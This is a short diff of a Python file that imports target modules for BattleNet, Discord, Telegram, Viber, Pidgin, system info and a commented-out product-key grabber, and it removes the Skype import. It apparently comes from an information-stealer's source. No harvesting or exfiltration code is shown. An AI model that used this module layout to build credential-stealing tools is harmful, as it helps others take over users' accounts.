@@ -11,7 +11,6 @@ from targets.games.battlenet import BattleNet
 from targets.messengers.discord import Discord
 from targets.messengers.telegram import Telegram
 from targets.messengers.viber import Viber
-from targets.messengers.skype import Skype
 from targets.messengers.pidgin import Pidgin
 from targets.system.system_info import SystemInfo
 # from targets.system.productkey import ProductKey
